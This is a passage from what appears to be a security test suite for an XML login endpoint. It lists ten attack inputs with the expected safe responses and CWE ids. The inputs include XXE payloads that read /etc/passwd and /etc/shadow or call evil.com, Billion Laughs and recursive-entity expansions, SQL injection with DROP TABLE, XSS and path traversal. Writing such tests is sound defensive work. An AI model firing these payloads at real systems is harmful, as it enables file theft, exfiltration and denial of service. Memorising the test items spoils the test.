    ],
    "sec_tests": [
        {
            "test_id": 0,
            "input": "/check_user?xml_content=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><login><userid>&xxe;</userid><password>pass123</password></login>",
            "expected_behavior/output": "Blocks XXE via entity resolution; returns 400 JSON error response",
            "CWE": "CWE-611"
        },
        {
            "test_id": 1,
            "input": "/check_user?xml_content=<?xml version='1.0'?><!DOCTYPE lolz [<!ENTITY lol 'lol'><!ENTITY lol2 '&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;'>]><login><userid>&lol2;</userid><password>test</password></login>",
            "expected_behavior/output": "Prevents Billion Laughs attack; returns 400 JSON error response",
            "CWE": "CWE-776"
        },
        {
            "test_id": 2,
            "input": "/check_user?xml_content=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY file SYSTEM 'file:///etc/shadow'>]><login><userid>admin</userid><password>&file;</password></login>",
            "expected_behavior/output": "Prevents local file inclusion; returns 400 JSON error response",
            "CWE": "CWE-611"
        },
        {
            "test_id": 3,
            "input": "/check_user?xml_content=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe SYSTEM 'http://evil.com/steal'>]><login><userid>&xxe;</userid><password>pass</password></login>",
            "expected_behavior/output": "Blocks remote network access via external entities; returns 400 JSON error response",
            "CWE": "CWE-611"
        },
        {
            "test_id": 4,
            "input": "/check_user?xml_content=<?xml version='1.0'?><!DOCTYPE foo SYSTEM 'http://evil.com/evil.dtd'><login><userid>admin</userid><password>test</password></login>",
            "expected_behavior/output": "Prevents external DTD loading; returns 400 JSON error response",
            "CWE": "CWE-611"
        },
        {
            "test_id": 5,
            "input": "/check_user?xml_content=<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY a '&b;'><!ENTITY b '&a;'>]><login><userid>&a;</userid><password>test</password></login>",
            "expected_behavior/output": "Prevents recursive entities; returns 400 JSON error response",
            "CWE": "CWE-611"
        },
        {
            "test_id": 6,
            "input": "/check_user?xml_content=<login><userid>admin'; DROP TABLE users; --</userid><password>test</password></login>",
            "expected_behavior/output": "No SQL queries executed; handled safely with 'Login failed' response",
            "CWE": "CWE-89"
        },
        {
            "test_id": 7,
            "input": "/check_user?xml_content=<login><userid><script>alert('xss')</script></userid><password>test</password></login>",
            "expected_behavior/output": "Treats XML text literally; returns 'Login failed' safely without XSS execution",
            "CWE": "CWE-79"
        },
        {
            "test_id": 8,
            "input": "/check_user?xml_content=<login><userid>../../../admin</userid><password>test</password></login>",
            "expected_behavior/output": "No path traversal effect; handled safely with 'Login failed'",
            "CWE": "CWE-22"
        },
        {
            "test_id": 9,
            "input": "/check_user?xml_content=<a><b><c><d><e><f><g><h><i><j><k><l><m><n><o><p><q><r><s><t><u><v><w><x><y><z><login><userid>admin</userid><password>test</password></login></z></y></x></w></v></u></t></s></r></q></p></o></n></m></l></k></j></i></h></g></f></e></d></c></b></a>",
            "expected_behavior/output": "Blocks deep nesting DoS; returns 400 JSON error response",
            "CWE": "CWE-776"
        }
